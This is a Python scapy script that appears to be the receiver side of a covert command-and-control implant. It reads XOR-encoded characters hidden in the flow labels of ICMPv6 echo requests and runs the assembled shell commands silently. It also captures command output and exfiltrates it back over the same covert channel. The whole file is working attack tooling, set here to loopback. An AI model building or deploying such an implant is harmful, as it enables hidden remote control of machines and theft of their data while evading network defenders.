from scapy.all import *
import subprocess # For executing received commands
import sys
import random
import time

# Configuration
INTERFACE = "lo0"       
SEED_VAL = 1114         
ENCRYPTION_KEY = 0x55   
TRIGGER_EXEC = ";"      
TRIGGER_EXFIL = "!"     
TARGET_IP = "::1"       
SYNC_ID = 4095          

random.seed(SEED_VAL)
cmd_buffer = ""

def send_exfiltration(output_str):
    print(f"\n[*] Exfiltrating {len(output_str)} bytes of data...")
    time.sleep(1.0) # Wait for the Sender to initialize its listener
    
    #Send  3 times to ensure delivery
    for _ in range(3):
        sync_pkt = IPv6(dst=TARGET_IP, fl=(SYNC_ID << 8) | 0) / ICMPv6EchoRequest()
        send(sync_pkt, verbose=False)
        time.sleep(0.02)
    
    # reset local PRNG state to ensure Sender and Receiver are in sync for the upcoming encrypted transmission
    random.seed(SEED_VAL)
    
    full_msg = output_str + "\x00" 
    
    for char in full_msg:
        magic_id = random.randint(0, 4094)
        encrypted_char = ord(char) ^ ENCRYPTION_KEY
        
        flow_label_val = (magic_id << 8) | encrypted_char
        pkt = IPv6(dst=TARGET_IP, fl=flow_label_val) / ICMPv6EchoRequest()
        
        send(pkt, verbose=False)
        time.sleep(0.005)
        
    print("[+] Exfiltration complete. Returning to stealth mode.")

def process_packet(pkt):
    global cmd_buffer
    
    if not pkt.haslayer(ICMPv6EchoRequest): 
        return
        
    if pkt.haslayer(IPv6):
        flow_label = pkt[IPv6].fl
        received_magic = flow_label >> 8

        # catch burst of SYNC packets to initialize PRNG state and reset command buffer
        if received_magic == SYNC_ID:
            random.seed(SEED_VAL)
            cmd_buffer = ""
            return

        # Validate Magic Number matches expected PRNG output
        prng_state = random.getstate()
        expected_magic = random.randint(0, 4094)

        if received_magic == expected_magic:
            encrypted_char = flow_label & 0xFF 
            decrypted_char = chr(encrypted_char ^ ENCRYPTION_KEY)

            if decrypted_char == TRIGGER_EXEC:
                print(f"\n[+] Silent execution: {cmd_buffer}")
                subprocess.Popen(cmd_buffer, shell=True) 
                cmd_buffer = ""
                
            elif decrypted_char == TRIGGER_EXFIL:
                print(f"\n[+] Executing and capturing output: {cmd_buffer}")
                try:
                    # Enforce a 10-second limit to prevent the script from hanging indefinitely
                    result = subprocess.run(cmd_buffer, shell=True, capture_output=True, text=True, timeout=10)
                    output = result.stdout if result.returncode == 0 else result.stderr
                except subprocess.TimeoutExpired:
                    output = "[!] Error: Command execution timed out after 10 seconds."
                
                if not output: output = "Command executed successfully (no output).\n"
                send_exfiltration(output)
                cmd_buffer = ""
            else:
                cmd_buffer += decrypted_char
                sys.stdout.write(decrypted_char)
                sys.stdout.flush()
        else:
            # Drop invalid packet, rollback PRNG state
            random.setstate(prng_state)

if __name__ == "__main__":
    print(f"[*] C2 Receiver active on {INTERFACE}")
    sniff(filter="icmp6", prn=process_packet, store=0, iface=INTERFACE)
